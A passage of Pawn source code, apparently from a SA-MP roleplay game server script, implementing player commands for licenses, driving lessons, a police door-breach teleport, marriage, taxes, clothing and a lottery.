                    SendClientMessage(playerid, COLOR_WHITE, "Available names: Flying, Sailing, Fishing, Weapon, Materials.");
                    return 1;
                }

                else if(strcmp(x_nr,"flying",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense flying [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pFlyLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Flying license to that player because his/her flying license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s given a Flying License to %s.",sendername,giveplayer);
                            SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Instructor %s has given you a Flying License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pFlyLic] = 300;
                            SaveKonVal(giveplayerid, "pFlyLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREEN, "That player is Offline.");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"sailing",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense sailing [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pBoatLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Sailing license to that player because his/her Sailing license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s given a Sailing License to %s.",sendername,giveplayer);
                            SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Instructor %s has given you a Sailing License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pBoatLic] = 300;
                            SaveKonVal(giveplayerid, "pBoatLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREEN, "That player is Offline.");
                        return 1;
                    }
                }
                else if(strcmp(x_nr,"weapon",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense weapon [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pGunLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Weapon license to that player because his/her Weapon license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s given a weapon License to %s.",sendername,giveplayer);
                            SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Instructor %s has given you a weapon License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pGunLic] = 300;
                            SaveKonVal(giveplayerid, "pGunLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREEN, "That player is Offline.");
                        return 1;
                    }
            }
                else if(strcmp(x_nr,"fishing",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense fishing [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s given a Fishing License to %s.",sendername,giveplayer);
                            SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Instructor %s has given you a Fishing License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pFishLic] = 300;
                            SaveKonVal(giveplayerid, "pFishLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREEN, "That player is Offline.");
                        return 1;
                    }
                }

            else if(strcmp(x_nr,"materials",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp))
                    {
                        SendClientMessage(playerid, COLOR_WHITE, "USAGE: /givelicense materials [playerid/PartOfName]");
                        return 1;
                    }
                    giveplayerid = ReturnUser(tmp);
                    if(IsPlayerConnected(giveplayerid))
                    {
                        if(giveplayerid != INVALID_PLAYER_ID)
                        {
                        if(PINFO[giveplayerid][pMatsLicS] > 0) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot give a Materials license to that player because his/her Materials license is suspended.");
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            format(string, sizeof(string), "%s given a materials License to %s.",sendername,giveplayer);
                            SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "Instructor %s has given you a materials License.",sendername);
                            SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                            PlayerInfo[giveplayerid][pMatsLic] = 300;
                            SaveKonVal(giveplayerid, "pMatsLic", 300);
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREEN, "That player is Offline.");
                        return 1;
                    }
            }
            else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a School Instructor.");
                return 1;
            }
        }

        else
            {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "You are not a School Instructor.");
                return 1;
            }
            return 1;
    }
}
    if(strcmp(cmd, "/startlesson", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAnInstructor(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /startlesson [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        format(string, sizeof(string), "%s started %s's Lesson.",sendername,giveplayer);
                        SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Instructor %s has started your Lesson.",sendername);
                        SendClientMessage(giveplayerid, COLOR_WHITE, string);
                        TakingsiLesson[giveplayerid] = 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a School Instructor !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/stoplesson", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAnInstructor(playerid))
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_WHITE, "USAGE: /stoplesson [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        if(TakingsiLesson[giveplayerid] != 1)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not taking a Lesson !");
                            return 1;
                        }
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        format(string, sizeof(string), "%s stopped %s's Lesson.",sendername,giveplayer);
                        SendFamilyMessage(11, COLOR_LIGHTBLUE, string);
                        format(string, sizeof(string), "Instructor %s has stopped your Lesson.",sendername);
                        SendClientMessage(giveplayerid, COLOR_WHITE, string);
                        TakingsiLesson[giveplayerid] = 0;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                    return 1;
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   You are not a School Instructor !");
                return 1;
            }
        }
        return 1;
    }
		if(strcmp(cmd, "/ram", true) == 0)
		{
			if(IsPlayerConnected(playerid))
			{
				if(gTeam[playerid] == TEAM_COP || PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 3 || PlayerInfo[playerid][pMember] == 3
				|| PINFO[playerid][pMember] == 8 || PINFO[playerid][pLeader] == 8 || PINFO[playerid][pMember] == 17 || PINFO[playerid][pLeader] == 17 || PINFO[playerid][pAdmin] >= 3 || PINFO[playerid][pLeader] >= 7)
				{
					if(OnDuty[playerid] != 1 && PINFO[playerid][pLeader] != 8 && PINFO[playerid][pMember] != 8 && PINFO[playerid][pLeader] != 17 && PINFO[playerid][pMember] != 17) return SCM(playerid,COLOR_BLUE,"You are not On-Duty.");
					GameTextForPlayer(playerid, "~r~Breached the door", 5000, 1);
					for(new house = 0; house < sizeof(HouseInfo); house++)
					{
						if (PlayerToPoint(4.0, playerid,HouseInfo[house][hExitx],HouseInfo[house][hExity],HouseInfo[house][hExitz]))
						{
							SetPlayerInterior(playerid,HouseInfo[house][hInt]);
							SetPlayerVirtualWorld(playerid,HouseInfo[house][hWorld]);
							SetPlayerPos(playerid,HouseInfo[house][hEntrancex],HouseInfo[house][hEntrancey],HouseInfo[house][hEntrancez]);
							Mahal[playerid] = 3;
							TooHouse[playerid] = house;
							TooBiz[playerid] = 9999;
						}
					}
					for(new bizid = 0; bizid < sizeof(BizzInfo); bizid++)
					{
						if (PlayerToPoint(4.0, playerid,BizzInfo[bizid][bEntranceX],BizzInfo[bizid][bEntranceY],BizzInfo[bizid][bEntranceZ]))
						{
							SetPlayerInterior(playerid,BizzInfo[bizid][bInterior]);
							SetPlayerPos(playerid,BizzInfo[bizid][bExitX],BizzInfo[bizid][bExitY],BizzInfo[bizid][bExitZ]);
							Mahal[playerid] = 15;
							TooHouse[playerid] = 9999;
							SetPlayerVirtualWorld(playerid,BizzInfo[bizid][bVW]);
							TooBiz[playerid] = bizid;
						}
					}
					if (PlayerToPoint(5, playerid, 2792.930175,-1087.530761,30.718750))
					{
						SetPlayerPos(playerid ,1298.830810,-795.336669,1084.007812);
						SetPlayerInterior(playerid, 5);
						Mahal[playerid] = 11;
						SetPlayerVirtualWorld(playerid, 40015);
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if (PlayerToPoint(2, playerid, 2637.1936,2352.0090,10.8203))
					{
						SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
						SetPlayerVirtualWorld(playerid, 40012);
						SetPlayerInterior(playerid, 5);
						Mahal[playerid] = 12;
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if (PlayerToPoint(2, playerid, 1455.4546,750.9794,11.0234))
					{
						SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
						SetPlayerVirtualWorld(playerid, 40014);
						SetPlayerInterior(playerid, 5);
						SetPlayerVirtualWorld(playerid, 62);
						Mahal[playerid] = 8;
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if (PlayerToPoint(2, playerid, 1122.7065,-2037.0063,69.8942))
					{
						SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
						SetPlayerVirtualWorld(playerid, 40013);
						SetPlayerInterior(playerid, 5);
						SetPlayerVirtualWorld(playerid, 61);
						Mahal[playerid] = 13;
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
				 if (PlayerToPoint(2, playerid, 2324.500000,-1148.900024,1050.710083))
					{
						SetPlayerPos(playerid, 2560.805175,1561.846069,10.820312);
						SetPlayerInterior(playerid, 12);
						SetPlayerVirtualWorld(playerid, 950);
						Mahal[playerid] = 199;
						TooHouse[playerid] = 950;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if(PlayerToPoint(2, playerid,725.5550,-1451.0232,17.6953))
					{
						SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
						SetPlayerVirtualWorld(playerid, 4005);
						SetPlayerInterior(playerid, 5);
						Mahal[playerid] = 7;
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if (PlayerToPoint(2, playerid,1456.7424,2773.4614,10.8203))
					{
						SetPlayerPos(playerid, 1298.830810,-795.336669,1084.007812);
						SetPlayerVirtualWorld(playerid, 4006);
						SetPlayerInterior(playerid, 5);
						Mahal[playerid] = 9;
						TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if(PlayerToPoint(2, playerid,1080.997192,-345.408233,73.984069))
					{
						SetPlayerPos(playerid, 1701.744262,-1667.856689,20.218750);
						SetPlayerVirtualWorld(playerid, 54);
						SetPlayerInterior(playerid, 18);
						Mahal[playerid] = 10;TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if (PlayerToPoint(5, playerid,937.3935,1733.2067,8.8516))
					{
						SetPlayerPos(playerid, 1494.325195,1304.942871,1093.289062);
						SetPlayerInterior(playerid, 3);
						SetPlayerVirtualWorld(playerid, 70);
						Mahal[playerid] = 14;TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
					if(PTP(5,playerid,1607.520996,1815.756591,10.820312))
					{
					   SetPlayerPos(playerid,1494.325195,1304.942871,1093.289062);
					   SetPlayerInterior(playerid,3);
					   SetPlayerVirtualWorld(playerid,71);
					   Mahal[playerid] = 70;TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
					   return 1;
					}
					if(PTP(5,playerid,649.123413,-1357.398437,13.568209))
					{
						SetPlayerPos(playerid,1494.325195,1304.942871,1093.289062);
						SetPlayerInterior(playerid,3);
						SetPlayerVirtualWorld(playerid,72);
						Mahal[playerid] = 71;TooHouse[playerid] = 9999;
						TooBiz[playerid] = 9999;
						return 1;
					}
				}
				else
				{
					SendMessage(playerid, COLOR_YELLOW2, "You are not a cop or hitman.");
					return 1;
				}
			}
			return 1;
		}
    if(strcmp(cmd,"/divorce",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(!strcmp(PINFO[playerid][pMarriedTo],"No-one",true))
            {
                SendClientMessage(playerid, COLOR_GREY, "You aren't Married !");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /divorce [Playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Propose to yourself!"); return 1; }
                        new dstring[MAX_PLAYER_NAME];
                        new wstring[MAX_PLAYER_NAME];
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "%s", giveplayer);
                        strmid(wstring, string, 0, strlen(string), 255);
                        format(string, sizeof(string), "%s", PlayerInfo[playerid][pMarriedTo]);
                        strmid(dstring, string, 0, strlen(string), 255);
                        if(strcmp(dstring ,wstring, true ) == 0 )
                        {
                            format(string, sizeof(string), "* You've sent Divorce Papers to %s.", giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* %s just sent you his Divorce Papers (type /accept divorce) to accept.", sendername);
                            SendClientMessage(giveplayerid, COLOR_WHITE, string);
                            DivorceOffer[giveplayerid] = playerid;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   That player is not Married to you !");
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/propose",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(GetPlayerPool(playerid) < 1000)
            {
                SendClientMessage(playerid, COLOR_GREY, "The Marriage & Reception costs $1,000.");
                return 1;
            }
            if(strcmp(PINFO[playerid][pMarriedTo],"No-one",true))
            {
                SendClientMessage(playerid, COLOR_GREY, "You are already Married !");
                return 1;
            }
            if(PlayerInfo[playerid][pPhousekey] == 9999)
            {
                SendClientMessage(playerid, COLOR_GREY, "You haven't a House to let your Wife / Hasband live somewhere !");
                return 1;
            }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /propose [Playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if(strcmp(PINFO[giveplayerid][pMarriedTo],"No-one",true))
                    {
                        SendClientMessage(playerid, COLOR_GREY, "That player is already Married !");
                        return 1;
                    }
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Propose to yourself!"); return 1; }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You proposed to %s.", giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "* %s just proposed to you (type /accept marriage) to accept.", sendername);
                        SendClientMessage(giveplayerid, COLOR_WHITE, string);
                        ProposeOffer[giveplayerid] = playerid;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/witness",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) {
                SendClientMessage(playerid, COLOR_WHITE, "USAGE: /witness [Playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(IsPlayerConnected(giveplayerid))
            {
                if(giveplayerid != INVALID_PLAYER_ID)
                {
                    if (ProxDetectorS(8.0, playerid, giveplayerid))
                    {
                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You cannot Propose to yourself!"); return 1; }
                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        format(string, sizeof(string), "* You requested %s to be your Marriage Witness.", giveplayer);
                        SendClientMessage(playerid, COLOR_WHITE, string);
                        format(string, sizeof(string), "* %s just requested you to be his Marriage Witness (type /accept witness) to accept.", sendername);
                        SendClientMessage(giveplayerid, COLOR_WHITE, string);
                        MarryWitnessOffer[giveplayerid] = playerid;
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "   That player is not near you !");
                        return 1;
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   That player is Offline !");
                return 1;
            }
        }
        return 1;
    }
    if(strcmp(cmd,"/settax",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pLeader] != 7) SendClientMessage(playerid, COLOR_LIGHTGREEN, "You are not The Mayor.");
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp)) {
                SendClientMessage(playerid, COL_SYN, "Syntax: /settax <Amount>");
                SCM(playerid,COLOR_WHITE,"USAGE: use 0 to disable it.");
                return 1;
            }
            moneys = strval(tmp);
            if((moneys >= 1 && moneys <= 5000) || moneys == 0)
            {
                Tax = moneys;
                SaveStuff();
                format(string, sizeof(string), "The Tax is $%s per player",FormatNumber(Tax));
                SendClientMessage(playerid, CRISTIAN, string);
            }
            else return SCM(playerid, COLOR_Good, "Tax may not be below 1$ or above 5000$ or 0 to disable it");
        }
        return 1;
    }
//---------------------------------------------------
    if(strcmp(cmd, "/spawnchange", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pPhousekey] != 9999)
            {
                if(SpawnChange[playerid])
                {
                    SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at your Normal Place !");
                    SpawnChange[playerid] = 0;
                    if(IsAnInstructor(playerid))
                    {
                        if(SchoolSpawn[playerid] == 0)
                        {
                            SchoolSpawn[playerid] = 1;
                            SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Flying School !");
                        }
                        else if(SchoolSpawn[playerid] == 1)
                        {
                            SchoolSpawn[playerid] = 0;
                            SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Driving School !");
                        }
                    }
                    if(IsAnTaxi(playerid))
                    {
                        if(TaxiSpawn[playerid] == 0)
                        {
                            TaxiSpawn[playerid] = 1;
                            SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Los Santos !");
                        }
                        else if(TaxiSpawn[playerid] == 1)
                        {
                            TaxiSpawn[playerid] = 0;
                            SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Las Venturas !");
                        }
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at your Own / Rented House !");
                    SpawnChange[playerid] = 1;
                }
            }
            else
            {
                if(IsAnInstructor(playerid))
                {
                    if(SchoolSpawn[playerid] == 0)
                    {
                        SchoolSpawn[playerid] = 1;
                        SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Flying School !");
                    }
                    else if(SchoolSpawn[playerid] == 1)
                    {
                        SchoolSpawn[playerid] = 0;
                        SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Driving School !");
                    }
                }
                if(IsAnTaxi(playerid))
                {
                    if(TaxiSpawn[playerid] == 0)
                    {
                        TaxiSpawn[playerid] = 1;
                        SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Los Santos !");
                    }
                    else if(TaxiSpawn[playerid] == 1)
                    {
                        TaxiSpawn[playerid] = 0;
                        SendClientMessage(playerid, COLOR_GREY, "   You will now spawn at the Las Venturas !");
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   You dont own / rent a House !");
                    return 1;
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/clothes", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pMember] >= 1)
            {
                if(IsAtClothShop(playerid))
                {
                    if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1) { ChosenSkin[playerid] = 280; SetPlayerSkin(playerid, 280); }
                    else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2) { ChosenSkin[playerid] = 286; SetPlayerSkin(playerid, 286); }
                    else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3) { ChosenSkin[playerid] = 93; SetPlayerSkin(playerid, 93); }
                    else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4) { ChosenSkin[playerid] = 141; SetPlayerSkin(playerid, 141); }
                    else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5) { ChosenSkin[playerid] = 121; SetPlayerSkin(playerid, 121); }
                    else if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6) { ChosenSkin[playerid] = 233; SetPlayerSkin(playerid, 233); }
                    else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8) { ChosenSkin[playerid] = 117; SetPlayerSkin(playerid, 117); }
                    else if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9) { ChosenSkin[playerid] = 148; SetPlayerSkin(playerid, 148); }
                    else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10) { ChosenSkin[playerid] = 255; SetPlayerSkin(playerid, 255); }
                    else if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) { ChosenSkin[playerid] = 153; SetPlayerSkin(playerid, 153); }
                    else if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12) { ChosenSkin[playerid] = 105; SetPlayerSkin(playerid, 105); }
                    else if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13) { ChosenSkin[playerid] = 122; SetPlayerSkin(playerid, 122); }
                    else if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14) { ChosenSkin[playerid] = 102; SetPlayerSkin(playerid, 102); }
                    else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15) { ChosenSkin[playerid] = 173; SetPlayerSkin(playerid, 173); }
                    else if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16) { ChosenSkin[playerid] = 50; SetPlayerSkin(playerid, 50); }
                    else { return 1; }
                    GetPlayerPos(playerid, ChangePos[playerid][0],ChangePos[playerid][1],ChangePos[playerid][2]);
                    ChangePos2[playerid][0] = GetPlayerInterior(playerid);
                    ChangePos2[playerid][1] = 1;
                    SetPlayerInterior(playerid,0);
                    new rand = random(sizeof(gInviteSpawns));
                    new member = PlayerInfo[playerid][pMember];
                    SetPlayerPosEx(playerid, gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]); // Warp the player
                    SetPlayerFacingAngle(playerid, gInviteSpawns[rand][3]);
                    SetPlayerCameraPos(playerid,gInviteSpawns[rand][0] + 3, gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
                    SetPlayerCameraLookAt(playerid,gInviteSpawns[rand][0], gInviteSpawns[rand][1], gInviteSpawns[rand][2]);
                    TogglePlayerControllable(playerid, 0);
                    SelectCharID[playerid] = member;
                    SelectCharPlace[playerid] = 1;
                    PlayerInfo[playerid][fSkin] = ChosenSkin[playerid];
                    SaveKonVal(playerid, "fSkin", ChosenSkin[playerid]);
                    ShowPlayerDialog(playerid, 427, DIALOG_STYLE_MSGBOX,"Chlothes:", "Press 'Next' to select the clothes.\nPress 'Done' once you have chosen the clothes.","Next", "Done");
                    TogglePlayerControllable(playerid, 1);
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "** You are not in a Clothing Shop !");
                    return 1;
                }
            }
            else
            {
                if(PlayerInfo[playerid][pLeader] >= 1)
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "** You can't change your clothes while you are a leader !");
                    return 1;
                }
                return SCM(playerid, COLOR_ALI, "You are not a member of any faction.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/lotto", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pLottoNr] > 0)
            {
                SendClientMessage(playerid, COLOR_GREY, "** You already have a Lottery Ticket !");
                return 1;
            }
            if(GetPlayerPool(playerid) < 150)
            {
                SendClientMessage(playerid, COLOR_GREY, "** You need $150 for a Lottery Ticket !");
                return 1;
            }
            new rands = RandomShomare(1,80);
            format(string, sizeof(string), "You bought a Lottery Ticket with number: %d.", rands);
            SendClientMessage(playerid, COLOR_YELLOW, string);
            GivePlayerPool(playerid, -150);
            GameTextForPlayer(playerid, "~r~-$150", 5000, 1);
            PlayerInfo[playerid][pLottoNr] = rands;
            SaveKonVal(playerid, "pLottoNr", rands);
        }
        return 1;
    }
    if(strcmp(cmd, "/suspend", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(IsAPDMember(playerid))
            {
                new x_nr[256];
                x_nr = strtok(cmdtext, idx);
                if(!strlen(x_nr)) {
                    SendClientMessage(playerid, CRISTIAN, "|__________________ Suspend Licenses __________________|");
                    SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend [licensename] [playerid/PartOfName] [hours]");
                    SendClientMessage(playerid, COLOR_GREY, "Available names: Driving, Flying, Boating, Weapons, Materials");
                    SendClientMessage(playerid, CRISTIAN, "|___________________________________________________|");
                    return true;
                }
                else if(strcmp(x_nr,"Flying",true) == 0)
                {
                    tmp = strtok(cmdtext, idx);
                    if(!strlen(tmp)) {
                        SendClientMessage(playerid, COLOR_WHITE, "Type: /suspend flying [playerid/PartOfName] [hours]");
                        return true;
                    }
                    giveplayerid = ReturnUser(tmp);
                    GetPlayerName(playerid, sendername, sizeof(sendername));
                    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                    new stime = 1;
                    tmp = strtok(cmdtext, idx);
                    stime = strval(tmp);

                    if(stime < 1 || stime > 5)
                    {
                        SendClientMessage(playerid, COL_SYN, "Hours must be no lower than 1 and no higher than 5.");
                        return true;
                    }

                    if (PlayerInfo[giveplayerid][pFlyLic] == 0)
                    {
